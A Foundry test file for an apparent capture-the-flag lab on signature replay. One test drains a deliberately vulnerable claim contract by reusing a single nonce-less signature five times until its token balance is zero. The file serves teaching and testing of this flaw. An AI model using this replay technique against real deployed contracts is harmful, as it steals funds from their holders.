// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {Q10ReplayLab, Q10VulnerableSigClaim, Q10MockToken} from "../src/Setup.sol";

contract Q10ReplayPublicTest is Test {
    Q10ReplayLab internal lab;
    address internal alice = makeAddr("alice");

    function setUp() public {
        lab = new Q10ReplayLab();
    }

    function test_CreateInstanceIsUnsolved() public {
        vm.prank(alice);
        address claim = lab.createInstance(alice);

        assertTrue(claim != address(0));
        assertFalse(lab.isSolved(alice));
    }

    function test_DuplicateInstanceIsRejected() public {
        vm.startPrank(alice);
        lab.createInstance(alice);
        vm.expectRevert(bytes("already created"));
        lab.createInstance(alice);
        vm.stopPrank();
    }

    /// @notice Drives the replay exploit end-to-end to prove the tokenized
    ///         version still flips `isSolved`. One signature over (to, amount)
    ///         is reused until the claim contract's token balance hits zero.
    function test_ReplayDrainsToken() public {
        (address signer, uint256 signerKey) = makeAddrAndKey("signer");

        vm.prank(alice);
        address claimAddr = lab.createInstance(signer);
        Q10VulnerableSigClaim claim = Q10VulnerableSigClaim(claimAddr);
        Q10MockToken token = claim.token();

        uint256 seed = lab.SEED();
        assertEq(token.balanceOf(address(claim)), seed);

        // Sign a single payout of `chunk` to alice — no nonce, so it replays.
        uint256 chunk = seed / 5;
        bytes32 raw = keccak256(abi.encode(alice, chunk));
        bytes32 ethHash = MessageHashUtils.toEthSignedMessageHash(raw);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // Reuse the SAME signature five times to drain the whole seed.
        for (uint256 i = 0; i < 5; i++) {
            claim.claim(alice, chunk, sig);
        }

        assertEq(token.balanceOf(address(claim)), 0);
        assertTrue(lab.isSolved(alice));
    }
}
